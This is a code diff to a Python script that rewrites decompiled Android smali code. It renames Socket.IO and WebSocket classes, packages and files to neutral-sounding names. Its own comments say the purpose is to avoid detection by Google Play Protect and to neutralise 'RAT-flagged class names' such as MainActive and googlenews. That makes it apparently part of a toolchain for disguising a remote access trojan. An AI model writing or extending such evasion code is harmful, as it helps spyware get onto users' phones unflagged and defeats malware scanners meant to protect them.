@@ -1890,18 +1890,42 @@ def step_6e_rename_socket_package(new_pkg: str) -> int:
     _py_sed(smali_dir, "Sec-WebSocket-Key",    "Sec-Protocol-Key")
     _py_sed(smali_dir, "websocket",            "datastream")
     _py_sed(smali_dir, "WebSocket",            "DataPipe")
-    print("  ✅ WebSocket class name → DataPipe (type descriptors + refs)")
+    print("  ✅ WebSocket → DataPipe")
 
-    # 2b. Rename WebSocket smali FILES on disk (not just content)
-    for _root, _dirs, _files in os.walk(smali_dir):
-        for _fname in _files:
-            if "WebSocket" in _fname:
-                _old = os.path.join(_root, _fname)
-                _new = os.path.join(_root, _fname.replace("WebSocket", "DataPipe"))
+    # 2b. Rename engineio → netcore (GPP knows engineio = Socket.IO engine)
+    _py_sed(smali_dir, "/engineio/",           "/netcore/")
+    _py_sed(smali_dir, "engineio",             "netcore")
+    print("  ✅ engineio → netcore")
+
+    # 2c. Rename client → endpoint in Socket.IO type descriptors
+    _py_sed(smali_dir, "/netlib/client/",           "/netlib/endpoint/")
+    _py_sed(smali_dir, "/netlib/netcore/client/",   "/netlib/netcore/endpoint/")
+    print("  ✅ client → endpoint")
+
+    # 2d. Rename Socket class → DataChannel
+    _py_sed(smali_dir, "/Socket;",             "/DataChannel;")
+    _py_sed(smali_dir, "/Socket$",             "/DataChannel$")
+    print("  ✅ Socket → DataChannel")
+
+    # 2e. Rename RAT-flagged class names
+    _py_sed(smali_dir, "MainActive",           "BaseFragment")
+    _py_sed(smali_dir, "googlenews",           "feedhandler")
+    print("  ✅ RAT class names neutralized")
+
+    # 2f. Rename smali FILES on disk for all renames above
+    for _root2, _dirs2, _files2 in os.walk(smali_dir):
+        for _fname2 in list(_files2):
+            _nfname = _fname2
+            for _on, _nn in [("WebSocket","DataPipe"),("engineio","netcore"),
+                              ("MainActive","BaseFragment")]:
+                _nfname = _nfname.replace(_on, _nn)
+            if _nfname != _fname2:
                 try:
-                    os.rename(_old, _new)
+                    os.rename(os.path.join(_root2,_fname2),
+                              os.path.join(_root2,_nfname))
                 except Exception:
                     pass
+    print("  ✅ Smali files renamed on disk")
 
     # 2. Move the smali directory tree: smali/io/socket/* → smali/com/netlib/*
     old_dir = os.path.join(smali_dir, "io", "socket")
